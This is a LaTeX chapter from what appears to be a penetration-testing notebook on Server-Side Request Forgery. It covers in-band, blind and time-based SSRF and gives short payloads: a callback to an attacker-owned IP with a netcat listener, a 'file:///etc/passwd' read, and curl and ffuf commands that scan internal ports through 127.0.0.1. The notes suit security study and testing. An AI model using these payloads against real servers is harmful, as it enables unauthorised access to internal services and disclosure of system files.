\chapter{SSRF: Server Side Request Forgery}

\section{Introduction}
Server-Side Request Forgery (SSRF) attacks allow to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:
\begin{itemize}
\item Interacting with known internal systems
\item Discovering internal services via port scans
\item Disclosing local/sensitive data
\item Including files in the target application
\item Leaking NetNTLM hashes using UNC Paths (Windows)
\item Achieving remote code execution
\end{itemize}

SSRF vulnerabilities is usually in applications that fetch remote resources.
look for:
\begin{itemize}
\item Parts of HTTP requests, including URLs
\item File imports such as HTML, PDFs, images, etc.
\item Remote server connections to fetch data
\item API specification imports
\item Dashboards including ping and similar functionalities to check server statuses
\end{itemize}



\section{In-band SSRF}

\begin{verbatim}
?q=index.html
\end{verbatim}

Try with a netcat listening a basic payload

\begin{verbatim}
?q=http://OWNED-IP:PORT
\end{verbatim}

it might be possible that the \verb+User-Agent+ header expose the library
behing like
\href{https://docs.python.org/3.8/library/urllib.html}{Python-urllib}. In such
a case it is possible to identify the schemas supported (\verb+file+,
\verb+http+,\ldots)

\subsection{File disclosure}
\begin{verbatim}
?q=file:///etc/passwd
\end{verbatim}

\subsection{port enumeration}

\begin{verbatim}
curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"
\end{verbatim}

according to the feedback

\begin{verbatim}
ffuf -w ports.txt:PORT -u "http://TARGET_IP/load?q=http://127.0.0.1:PORT" -fs 30
\end{verbatim}

for each port discovered it is worth checking what it is hiding.

\begin{verbatim}
curl -i -s "http://TARGET_IP/load?q=http://127.0.0.1:5000"
\end{verbatim}


\section{Blind SSRF}
blind SSRF vulnerabilities can be detected via out-of-band techniques, making
the server issue a request to an external service under control. To detect if a
backend service is processing requests, online tools like
\href{http://pingb.in}{http://pingb.in}can be used. 

Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP
Headers, among other locations.



\section{Time-Based SSRF}

It is possible to determine the existence of an SSRF vulnerability by observing
time differences in responses. This method is also helpful for discovering
internal services.
